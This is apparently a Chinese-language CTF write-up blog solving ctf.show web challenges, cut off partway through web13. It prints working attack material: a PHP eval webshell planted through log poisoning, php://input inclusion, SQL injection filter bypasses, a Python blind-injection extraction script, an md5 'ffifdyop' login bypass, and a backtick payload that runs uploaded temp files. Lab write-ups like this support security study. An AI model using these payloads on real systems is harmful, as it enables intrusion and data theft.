<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题面： <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code><br>可以找到etc&#x2F;passwd<br>法一： 利用之前dc系列靶机的思路 利用访问记录文件 用bp抓包写入一句话木马 然后用蚁剑连接<br>先找到真实的相对路径  用bp<br><img src="https://pic1.imgdb.cn/item/67ac6279d0e0a243d4fe9780.png" alt="|325"><br>发现相对路径是三重<br>然后我们再用bp发一个请求<br>然后访问..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>这题和dc5那题不一样的是一句话木马要写在User-Agent那里  根据log文件回显内容来定<br><img src="https://pic1.imgdb.cn/item/67ac627dd0e0a243d4fe9782.png"><br>这里还因为ctfshow是https 所以还要修改这个其他设置<br>法二：利用php伪协议<br>&#x2F;?url&#x3D;php:&#x2F;&#x2F;input   php脚本可以直接读取POST请求中的原始数据<br><img src="https://pic1.imgdb.cn/item/67ac6282d0e0a243d4fe9785.png" alt="|650"><br>页面回显两个文件 进入查看flag</p>
<p>法二：sqlmap作弊  但是要花不少时间跑</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><img src="https://pic1.imgdb.cn/item/67ac62c9d0e0a243d4fe979a.png"><br>输入常见的sql注入语句之后会出现sql inject error  测试之后发现了空格被过滤<br>可以用<code>/**/</code> 绕过  接着和常规sql注入一样<br><img src="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979b.png" alt="|375"><br>过滤 or and xor not 绕过 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">and</span> = &amp;&amp; </span><br><span class="line"><span class="attr">or</span> = || </span><br><span class="line"><span class="attr">xor</span> = | <span class="comment"># 异或 </span></span><br><span class="line"><span class="attr">not</span> = !</span><br></pre></td></tr></table></figure></div>
<p>&#x3D;绕过    like  大小于号过滤   !&lt;&gt;(&lt;&gt;等价于！&#x3D;)</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><img src="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979c.png"></p>
<h2 id="基于布尔的sql注入"><a href="#基于布尔的sql注入" class="headerlink" title="基于布尔的sql注入"></a>基于布尔的sql注入</h2><p>先去看看过滤了哪些字符<br>逐个尝试字符 发现 ‘ 空格 +  and or union等等都给过滤了 但是select没有过滤  所以没有union页面的信息不能回显<br>怎么办呢？ 数据库内置函数 <code>ascii()</code> 和 <code>substr()</code> 是可以将我们查询的字符串每个字符提取出来<br>sql injection payload：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1||ascii(substr((&#123;&#123;select查询结果字符串&#125;&#125;)/**/<span class="keyword">from</span>/**/&#123;&#123;提取子串位置&#125;&#125;/**/<span class="keyword">for</span>/**/1))=&#123;当前可能的字符ascii值&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里的大括号只是占位符 实际应用的时候替换成实际需要的字符串，<code>from &#123;&#123;提取子串位置&#125;&#125;</code> 表示从第几个字符开始。<code>for 1</code> 表示提取 1 个字符。<br>这样子如果||后面的内容是true的话页面会有内容  如果是false就没有内容<br>这样子就遍历子串的位置   根据相应长度，可以判断字符在这个位置的具体字符（只有和这个具体字符匹配才能回显）<br>假设可能字符有 <code>[a-z]|[A-Z]|[0-9]|&#123;_,-,+,\,,\&#123;,\&#125;&#125;</code>，那么每次尝试的可能字符有 97 种，因为要等服务器响应，所以算上延迟假设 0.5s。<br>通常一个 flag 的长度在 9 到 60，最坏时间要 <code>0.5*60*97=2910s</code>，所以还是要等很久，那么如何优化呢？<br>可以利用二分的思路</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">id=<span class="number">-1</span>||ascii(substr((&#123;<span class="keyword">select</span>查询结果字符串&#125;)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>&#123;提取子串位置&#125;<span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&lt;=&#123;当前可能的字符ascii值&#125;</span><br></pre></td></tr></table></figure></div>
<p>运用二分查找可以，将查找 97 种的字符的平均次数降低为 6 次。因此再次计算最坏时间为 <code>0.5*60*6=180s</code>，当然实际情况会根据服务器响应速度降低很多。<br>编写py脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://390226a3-4612-416d-b31b-5f06c69cc09a.challenge.ctf.show/index.php?id=-1&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(<span class="keyword">mid</span>, <span class="built_in">num</span>):</span><br><span class="line">    sql = <span class="string">&quot;/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;:d&#125;/**/for/**/1))&lt;=&#123;:d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">num</span>,<span class="keyword">mid</span>)</span><br><span class="line">    payload = url + sql</span><br><span class="line">    res = requests.<span class="built_in">get</span>(payload)</span><br><span class="line">    <span class="literal">return</span> <span class="string">&#x27;If&#x27;</span> <span class="keyword">in</span> res.<span class="keyword">text</span></span><br><span class="line"></span><br><span class="line">def bsearch(l, r, <span class="built_in">num</span>):</span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        <span class="keyword">mid</span> = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> check(<span class="keyword">mid</span>, <span class="built_in">num</span>): r = <span class="keyword">mid</span>    <span class="comment"># check()判断mid是否满足性质</span></span><br><span class="line">        <span class="keyword">else</span>: l = <span class="keyword">mid</span> + <span class="number">1</span></span><br><span class="line">    <span class="literal">return</span> l</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    res = bsearch(l, r, <span class="built_in">num</span>)</span><br><span class="line">    <span class="keyword">if</span> chr(res) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(res)</span><br><span class="line">    print(f<span class="string">&#x27;第&#123;num&#125;次遍历结果:&#123;flag&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里选择了！作为终止结束判断符的原因是 查询结果超出flag长度之后，数据库返回特殊字符<br>太nb了</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><img src="https://pic1.imgdb.cn/item/67ac6308d0e0a243d4fe979f.png" alt="|475"><br>用bp爆破密码之后没有结果   进入robots.txt 界面  发现有一个index.phps界面<br>文件内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>在 mysql 内，用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;’ or ‘1xxxx’，那么就相当于 password&#x3D;’ or 1，所以返回值就是 true<br>md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx  利用这个传入ffifdyop参数  在hackbar中输入password&#x3D;ffifdyop   解决</p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a2.png"><br>点击取消就自动下载附件了  代码审计题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>可以看到过滤可这些常用的sql注入语法<br>看看大佬的payload：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">u<span class="attr">sername</span><span class="operator">=</span> admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span>group<span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup<span class="comment">/**/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>这里我们要学习sql语句中的group by  和 with rollup   来源：<a href="https://www.cnblogs.com/GTL-JU/p/16097234.html">https://www.cnblogs.com/GTL-JU/p/16097234.html</a><br><code>GROUP BY</code> 函数 ：<br>    <code>GROUP BY</code> 函数用于对查询结果进行分类。它后面跟随的字段指定了分类的依据。<br>	例如： <code>sql SELECT student FROM students GROUP BY age; -- 按照年龄将学生分类</code><br><code>WITH ROLLUP</code> 函数:<br>	<code>WITH ROLLUP</code> 函数通常跟在 <code>GROUP BY</code> 函数后面，用于对分类后的数据进行汇总统计。它会在 <code>GROUP BY</code> 函数的基础上生成汇总行，通常是按各分类的统计数据进行合计。加入 <code>WITH ROLLUP</code> 后，结果中会出现一行 <code>password</code> 为 <code>NULL</code>。<br>只进行group by函数 ：<br><img src="https://pic1.imgdb.cn/item/67ac6315d0e0a243d4fe97a4.png"><br>和with rollup一起啊使用：<br><img src="https://pic1.imgdb.cn/item/67ac6318d0e0a243d4fe97a5.png"></p>
<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p> <img src="https://pic1.imgdb.cn/item/67ac634dd0e0a243d4fe97b2.png"><br> 要让password和session中的password一样  用bp抓包修改<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"> <span class="attribute">GET</span> /login.php?password= HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span>: </span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;117&quot;</span>, <span class="string">&quot;Not;A=Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="number">0</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">117</span>.<span class="number">0</span>.<span class="number">5938</span>.<span class="number">132</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Site: same-origin</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Mode: navigate</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-User: ?<span class="number">1</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Dest: document</span><br><span class="line"><span class="attribute">Referer</span>: https://<span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure></div><br>这里吧Cookie清空 password也清空<br>解释： <code>Session</code> <strong>通常依赖 Cookie</strong> 来存储 <code>Session ID</code>，例如：<code>setcookie(&quot;PHPSESSID&quot;, session_id(), time() + 3600, &quot;/&quot;);</code><br>当用户访问服务器时，浏览器会自动携带 <code>PHPSESSID</code>，从而服务器可以找到对应的 <code>Session</code> 数据。</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><img src="https://pic1.imgdb.cn/item/67ac6350d0e0a243d4fe97b3.png"><br>查看网页源代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">   </span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|<span class="string">---</span>|</span><br><span class="line">||<span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width minimum-scale=1.0 maximum-scale=1.0 initial-scale=1.0&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;title&gt;ctf.show_web12&lt;/title&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;center&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h2&gt;ctf.show_web12&lt;/h2&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h4&gt;where is the flag?&lt;/h4&gt;</span>|</span><br><span class="line">||<span class="string">&lt;!-- hit:?cmd= --&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;/body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/html&gt;</span>|</span><br><span class="line">|||</span><br></pre></td></tr></table></figure></div>
<p>提示输入?cmd&#x3D;   输入?cmd&#x3D;phpinfo();测试 发现可以执行这个命令 说明有远程执行漏洞<br>方法1:用一句话木马 然后用蚁剑连接 <code>cmd=@eval($_POST[%27a%27]); </code><br>但是连接进去之后报错<br><img src="https://pic1.imgdb.cn/item/67ac6357d0e0a243d4fe97bb.png"><br>这是有些网站中会禁用 php 中的一些危险函数，导致即使上传马上去，也执行不了命令，很典型的就是<strong>宝塔的网站</strong>。 下载绕过 disable_functions 插件<br>蚁剑的插件市场要访问github要在设置代理 修改成梯子的代理<br><img src="https://pic1.imgdb.cn/item/67ac6359d0e0a243d4fe97be.png"><br><img src="https://pic1.imgdb.cn/item/67ac635bd0e0a243d4fe97c1.png" alt="|500"><br>选择这个模式终于可以访问终端</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">(www-data:/<span class="keyword">var</span>/www/html) <span class="variable">$ cat 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;9fad8f78-6005-4246-8932-5ce7635a1647&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">(www-data:/<span class="keyword">var</span>/www/html) $</span><br></pre></td></tr></table></figure></div>
<p>方法2: 用php中的glob函数  glob () 函数返回匹配指定模式的文件名或目录。 输入<code>?cmd=print_r(glob(&#39;*&#39;));</code><br>可以发现有两个php文件  有信息的那个php文件看不了 所以用highlight_file () 函数，可以使文件内容高亮显示，常用于读取文件<br><code>?cmd=highlight_file(%27903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php%27);</code></p>
<p>方法3: 用<code>scandir(&#39;*&#39;);</code> 函数 和2 差不多</p>
<h1 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h1><p>查看源码 提示输入cmd 用get请求传入cmd 给出php源码<br><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>这里过滤了很多符号 只有<code>p . \ = &lt; &gt; ?</code> 和反引号没有被屏蔽</p>
<ol>
<li><p>PHP 上传机制：</p>
<p> 在 php 中，使用 <code>Content-Type: multipart/form-data;</code> 上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code> 参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code>。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 phpXXXX.tmp（Windows 中）、php**.tmp（Linux 中）。我们可以发送一个上传文件的 post 包，此时 php 会将我们上传的文件保存在临时文件夹下，默认的文件名是 &#x2F;tmp&#x2F;phpxxxxxx，文件名最后 6 个字符是随机的大小写字母。如 &#x2F;tmp&#x2F;php123abc </p>
</li>
<li><p>PHP 中反引号作用：在 php 里面反引号里面的内容会被当做 shell 命令被执行。例如 <?php echo`whoami`; ?> 会直接当作命令执行   </p>
</li>
<li><p><code>.</code> 号相当于 <code>source</code> 命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作 shell 脚本执行 </p>
</li>
<li><p><code>&lt;?=</code> 相当于 <code>&lt;?php ehco</code> 的简写版</p>
</li>
<li><p><code>?</code> 相当于字符的通配符</p>
</li>
<li><p><code>+</code> 相当于空格  </p>
</li>
<li><p>payload 构造</p>
</li>
</ol>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&gt; /?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`;</span><br><span class="line">`<span class="meta">?&gt;</span>`：闭合前面的 `<span class="meta">&lt;?php</span>` 命令</span><br><span class="line">`<span class="meta">&lt;?=</span>`：相当于 `<span class="meta">&lt;?php</span> <span class="keyword">echo</span>`</span><br><span class="line">反引号：执行命令</span><br><span class="line">`.` 相当于 `source` 命令</span><br><span class="line">`+`：相当于空格</span><br><span class="line">`?`：文字通配符，负责执行上传的临时文件</span><br></pre></td></tr></table></figure></div>
<p>payload中用了??p 替代了tmp  p?p 代替php<br>先用hackbar发送post但是不传数据 然后指定<br>发送下面请求包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ee6eb8bb-2686-490f-84db-a4abf42beb04.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>244</span><br><span class="line"></span><br><span class="line"><span class="language-nix">-----------------------------<span class="number">10242300956292313528205888</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;fileUpload&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;1.txt&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> text<span class="symbol">/plain</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="comment">#! /bin/bash</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">cat <span class="symbol">/flag.txt</span></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>----------------------------<span class="number">1024230095629231352820588</span>8--</span></span><br></pre></td></tr></table></figure></div>
<p>我刚看到wp中的这个请求包也是一头雾水，把bp中抓的包发送到repeater中，然后修改第一行，请求方式改成POST，cmd传入payload<br>然后在Connection: close后面加上哪些参数，boundary可以自己定义。<br>使用Content-Type: multipart&#x2F;form-data</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>题目这里只有一个上传文件按钮<br>如果我随便上传一个文件会显示error file zise ，说明对文件的大小有限制  并且上传界面在&#x2F;upload.php中<br>根据网上的wp，知道如果想要看源文件，一般可以从.bak .git .hg  .DS_Store 获取，所以输入&#x2F;upload.php.bak，得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	